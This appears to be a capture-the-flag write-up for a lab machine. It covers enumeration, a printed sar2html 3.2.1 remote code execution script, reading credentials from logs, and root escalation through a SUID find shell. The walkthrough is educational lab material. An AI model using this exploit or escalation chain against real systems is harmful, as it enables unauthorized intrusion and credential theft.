# IP
10.10.173.15

## Enumeration 

### Nmap
Found 4 ports running on the system.

```console
❯ nmap -sC -sV -p- -vvv 10.10.173.15 --min-rate=700 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 09:37 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:37
Completed NSE at 09:37, 0.00s elapsed
Initiating Ping Scan at 09:37
Scanning 10.10.173.15 [2 ports]
Completed Ping Scan at 09:37, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:37
Completed Parallel DNS resolution of 1 host. at 09:37, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:37
Scanning 10.10.173.15 [65535 ports]
Discovered open port 21/tcp on 10.10.173.15
Discovered open port 80/tcp on 10.10.173.15
Connect Scan Timing: About 30.79% done; ETC: 09:39 (0:01:10 remaining)
Connect Scan Timing: About 61.36% done; ETC: 09:39 (0:00:38 remaining)
Discovered open port 10000/tcp on 10.10.173.15
Discovered open port 55007/tcp on 10.10.173.15
Completed Connect Scan at 09:39, 101.08s elapsed (65535 total ports)
Initiating Service scan at 09:39
Scanning 4 services on 10.10.173.15
Completed Service scan at 09:39, 6.35s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.173.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:39
NSE: [ftp-bounce 10.10.173.15:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.82% done; ETC: 09:40 (0:00:00 remaining)
Completed NSE at 09:40, 31.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 1.18s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.01s elapsed
Nmap scan report for 10.10.173.15
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-03 09:37:42 IST for 141s
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.0.215
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 5CD8135B5239935906B84DF610C6E67A
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:40
Completed NSE at 09:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.21 seconds
```

### FTP
- Did an anonymous login.
- Found a `.info.txt` file.
- This was encoded as `Caeser cypher`.

```console
❯ ftp 10.10.173.15
Connected to 10.10.173.15.
220 (vsFTPd 3.0.3)
Name (10.10.173.15:divu050704): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||41634|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||45761|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |******************************************************************************************************************************************|    74        1.17 MiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.48 KiB/s)
ftp> exit
221 Goodbye.
❯ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl
```

- Decoded text:- `Just wanted to see if you find it. Lol. Remember: Enumeration is the key!`
- DAMN YOU.

### Webmin(1.930)
- Searching for exploit of Webmin(1.930) found no exploit.

```console
❯ searchsploit webmin
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                      | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                     | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                 | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                             | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                    | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                          | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                              | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                   | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                         | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                   | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                              | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                 | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                               | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                 | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                    | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                      | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                           | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                     | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                                                 | linux/webapps/50809.py
Webmin 1.x - HTML Email Command Execution                                                                                                            | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                         | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                         | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                        | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### Port:10000 (Web)
- On going to port 10000 found that the web server is running is SSL mode on https://ip-10-10-173-15.eu-west-1.compute.internal:10000/ 

```console
❯ curl http://10.10.173.15:10000
<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-173-15.eu-west-1.compute.internal:10000/'>https://ip-10-10-173-15.eu-west-1.compute.internal:10000/</a> instead.<br></p>
```

- Added https://ip-10-10-173-15.eu-west-1.compute.internal 10.10.173.15 to `/etc/hosts` and again accessed the webpage.
- Found nothing but a login screen, tried using simple sqli bypass payloads, but no success.

### Gobuster:80(/)
- Started gobuster on port 80 and found a cms and directory `Joomla`

```console
❯ gobuster dir --url http://ip-10-10-173-15.eu-west-1.compute.internal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,js,xml | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ip-10-10-173-15.eu-west-1.compute.internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,js,xml
[+] Timeout:                 10s
===============================================================
2022/11/03 10:03:12 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 373] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/manual/]
/robots.txt           (Status: 200) [Size: 257]
/joomla               (Status: 301) [Size: 373] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/]
Progress: 43125 / 1102805 (3.91%)                                                                             ^C

```

### Gobuster:80(/joomla)
- Started gobuster on `/joomla` directory

```console
❯ gobuster dir --url http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/ -w /usr/share/dirb/wordlists/common.txt | tee gobuster_joomla.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/03 10:56:21 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 333]
/.hta                 (Status: 403) [Size: 328]
/.htpasswd            (Status: 403) [Size: 333]
/_archive             (Status: 301) [Size: 382] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/_archive/]
/_database            (Status: 301) [Size: 383] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/_database/]
/_files               (Status: 301) [Size: 380] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/_files/]   
/_test                (Status: 301) [Size: 379] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/_test/]    
/~www                 (Status: 301) [Size: 378] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/~www/]     
/administrator        (Status: 301) [Size: 387] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/administrator/]
/bin                  (Status: 301) [Size: 377] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/bin/]          
/build                (Status: 301) [Size: 379] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/build/]        
/cache                (Status: 301) [Size: 379] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/cache/]        
/components           (Status: 301) [Size: 384] [--> http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/components/] 
```

- It had a text which double base64 encoded

```console
❯ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
Whopsie daisy
```

- Nothing interesting.
- On going to `joomla/_test` found `sar2html` running.
- Searched for exploits for `sar2html` and got one.


## Exploitation
## `sar2html`

```console
❯ searchsploit sar2html
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                        | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                            | php/webapps/47204.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Downloaded the exploit 

```console
❯ searchsploit -m php/webapps/49344.py
  Exploit: sar2html 3.2.1 - 'plot' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49344
     Path: /usr/share/exploitdb/exploits/php/webapps/49344.py
File Type: Python script, ASCII text executable

Copied to: /home/divu050704/tryhackme-notes/boilerctf2/49344.py
```

- On reading found we need to give url as an input

```python
# Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution
# Date: 27-12-2020
# Exploit Author: Musyoka Ian
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Ubuntu 18.04.1

#!/usr/bin/env python3

import requests
import re
from cmd import Cmd

url = input("Enter The url => ")

class Terminal(Cmd):
    prompt = "Command => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()%
```
- Started the exploit.

```console
❯ python3 49344.py
Enter The url => http://ip-10-10-173-15.eu-west-1.compute.internal/joomla/_test/index.php
Command => whoami
HPUX
Linux
SunOS
www-data
```

- Searched for some file and found `log.txt` and ssh password for `basterd`: `superduperp@$$`

```console
Command => ls
HPUX
Linux
SunOS
index.php
log.txt
sar2html
sarFILE

Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

## SSH
- Logged in with cred 

```console
❯ ssh basterd@10.10.173.15  -p 55007
The authenticity of host '[10.10.173.15]:55007 ([10.10.173.15]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.173.15]:55007' (ED25519) to the list of known hosts.
basterd@10.10.173.15's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$
```
- Found a `backup.sh` file with a password for user `stoner` : `superduperp@$$no1knows` 

```console
$ ls
backup.sh
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG

		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi
    done


else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```
- Changed access to stoner.

```console
$ su stoner
Password:
stoner@Vulnerable:/home/basterd$ find / -name "user.txt" 2>/dev/null
```

- Didn't find any flag.
- Went to home directory of `stoner` and found user flag as `.secret`.
```console
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

- On searching for commands allowed for user `stoner` to run as root found /NotThisTime/MessinWithYa

```console
stoner@Vulnerable:~/.nano$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

- Didn't find such file, DAMN HIM.

```console
stoner@Vulnerable:~/.nano$ cat /NotThisTime/MessinWithYa
cat: /NotThisTime/MessinWithYa: No such file or directory
stoner@Vulnerable:~/.nano$ find / -name "MessinWithYa" 2>/dev/null
stoner@Vulnerable:~/.nano$
```
- Searched for files with root permissions.

```console
stoner@Vulnerable:~/.nano$ find / -name "MessinWithYa" 2>/dev/null
stoner@Vulnerable:~/.nano$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```
- Found `find` with root permissions. 

```console
stoner@Vulnerable:~/.nano$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

- On looking on gtfobins found an exploit.

```console
stoner@Vulnerable:~/.nano$ find . -exec /bin/sh -p \; -quit 
# whoami
root
```

- Thank god root flag was at its place.

```console
# cd /root
# ls
root.txt
# cat root.txt
It wasn't that hard, was it?
#


```
